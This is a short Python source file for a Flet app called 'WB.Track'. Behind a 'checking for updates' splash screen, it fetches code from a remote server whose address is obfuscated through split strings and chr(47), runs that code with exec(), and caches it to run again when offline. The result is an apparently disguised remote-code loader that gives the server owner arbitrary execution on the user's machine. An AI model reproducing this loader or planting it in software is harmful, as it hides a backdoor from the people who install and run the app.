import threading
import flet as ft
import requests

S = chr(47)
API = "".join(["ht", "tps:", S, S, "yurevlive.", "pythonanywhere.", "com"])
P1, BG = "#CB11AB", "#121216"

def main(page: ft.Page):
    page.title = "WB.Track [by.Жекич]"
    page.theme_mode = ft.ThemeMode.DARK
    page.bgcolor, page.padding = BG, 0

    st_lbl = ft.Text("Проверка обновлений...", size=13, color="#E040FB")
    splash = ft.Container(
        height=620, bgcolor=BG, alignment=ft.alignment.center,
        content=ft.Column([
            ft.Icon(ft.Icons.TRACK_CHANGES_ROUNDED, size=64, color=P1),
            ft.Text("WB.Track", size=38, weight="bold", color="white"),
            ft.Text("[by.Жекич]", size=18, color="#E040FB"),
            ft.Container(height=16),
            st_lbl
        ], alignment=ft.MainAxisAlignment.CENTER, horizontal_alignment=ft.CrossAxisAlignment.CENTER)
    )
    page.add(splash)

    def boot():
        code = ""
        try:
            r = requests.get(API + S + "get_ui", timeout=8)
            if r.status_code == 200 and "def run_app" in r.text:
                code = r.text
                page.client_storage.set("cached_ui", code)
        except Exception:
            pass

        if not code:
            code = page.client_storage.get("cached_ui") or ""

        if code:
            ns = {}
            exec(code, ns)
            ns["run_app"](page)
        else:
            st_lbl.value = "⚠️ Нет связи с сервером"
            st_lbl.color = "#FF5252"
            page.update()

    threading.Timer(1.0, boot).start()

ft.app(target=main)
